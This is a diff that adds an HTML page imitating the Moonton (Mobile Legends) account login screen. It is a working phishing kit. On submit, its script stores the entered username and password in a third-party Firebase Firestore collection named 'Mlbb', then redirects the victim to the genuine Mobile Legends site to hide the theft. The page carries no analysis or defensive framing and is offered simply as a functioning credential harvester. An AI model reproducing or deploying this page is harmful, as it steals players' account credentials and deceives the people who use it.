@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moonton Account Login</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: #0a0e17 url('https://preview.redd.it/f3v326y3p6651.png?auto=webp&s=d280695038e21943019315354972f0f46c3746c8') no-repeat center center fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* --- Pure CSS Moonton Logo --- */
+        .css-logo-container {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .moonton-text {
+            color: #fff;
+            font-size: 35px;
+            font-weight: 800;
+            letter-spacing: -1px;
+            font-family: 'Arial Black', sans-serif;
+            text-transform: uppercase;
+            position: relative;
+            display: inline-block;
+        }
+        .moonton-text span {
+            color: #00a2ff; /* Moonton Blue */
+            position: relative;
+        }
+        /* အောက်က အစက်ကလေး သို့မဟုတ် line စတိုင် */
+        .moonton-text::after {
+            content: '';
+            position: absolute;
+            bottom: 2px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #00a2ff 0%, transparent 100%);
+            border-radius: 2px;
+        }
+        /* ---------------------------- */
+
+        .login-card {
+            background: rgba(16, 23, 36, 0.95);
+            border-radius: 4px;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8);
+            position: relative;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        h2 {
+            color: #fff;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 3px;
+            margin-bottom: 35px;
+            font-weight: 500;
+            color: #8a96a3;
+        }
+        .form-control {
+            background: transparent;
+            border: none;
+            border-bottom: 2px solid #3d4a5e;
+            border-radius: 0;
+            color: #fff;
+            padding: 12px 5px;
+        }
+        .form-control:focus {
+            background: transparent;
+            border-bottom-color: #00a2ff;
+            color: #fff;
+            box-shadow: none;
+        }
+        .form-floating label { color: #6a7c92; }
+        .form-floating > .form-control:focus ~ label,
+        .form-floating > .form-control:not(:placeholder-shown) ~ label {
+            color: #00a2ff;
+        }
+        .btn-moonton {
+            background-color: #00a2ff;
+            border: none;
+            color: white;
+            width: 100%;
+            padding: 12px;
+            font-weight: bold;
+            margin-top: 20px;
+            text-transform: uppercase;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            font-size: 13px;
+        }
+        .footer-links a { color: #6a7c92; text-decoration: none; }
+        .footer-links a span { color: #00a2ff; }
+        .progress { height: 3px; position: absolute; top: 0; left: 0; width: 100%; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="login-card overflow-hidden">
+    <div class="progress" id="loadingBar">
+        <div class="progress-bar progress-bar-striped progress-bar-animated" style="width: 100%; background-color: #00a2ff;"></div>
+    </div>
+    
+    <div class="css-logo-container">
+        <div class="moonton-text">MOON<span>TON</span></div>
+    </div>
+
+    <h2>MOONTON ACCOUNT</h2>
+
+    <form id="mlForm">
+        <div class="form-floating mb-4">
+            <input type="text" class="form-control" id="username" placeholder="Email" required>
+            <label>Moonton Account/Email</label>
+        </div>
+        <div class="form-floating mb-4">
+            <input type="password" class="form-control" id="password" placeholder="Password" required>
+            <label>Password</label>
+        </div>
+
+        <button type="submit" id="loginBtn" class="btn-moonton">Sign In</button>
+    </form>
+
+    <div class="footer-links">
+        <a href="#">Forgot Password?</a>
+        <a href="#"><span>Register Now</span></a>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyCK8750OLb7WCLyXV2JIL1RaTth55wOQII",
+        authDomain: "main-apk-3209b.firebaseapp.com",
+        projectId: "main-apk-3209b",
+        storageBucket: "main-apk-3209b.firebasestorage.app",
+        messagingSenderId: "729839795941",
+        appId: "1:729839795941:web:48b23f39e7bf6f3cf11e0c"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const mlForm = document.getElementById('mlForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const loadingBar = document.getElementById('loadingBar');
+
+    mlForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        loginBtn.disabled = true;
+        loginBtn.innerText = "SIGNING IN...";
+        loadingBar.style.display = "flex";
+
+        try {
+            await addDoc(collection(db, "Mlbb"), {
+                Username: username,
+                Password: password,
+                createdAt: new Date()
+            });
+            window.location.href = "https://m.mobilelegends.com/";
+        } catch (error) {
+            console.error(error);
+            loginBtn.disabled = false;
+            loginBtn.innerText = "SIGN IN";
+            loadingBar.style.display = "none";
+        }
+    });
+</script>
+
+</body>
+</html>
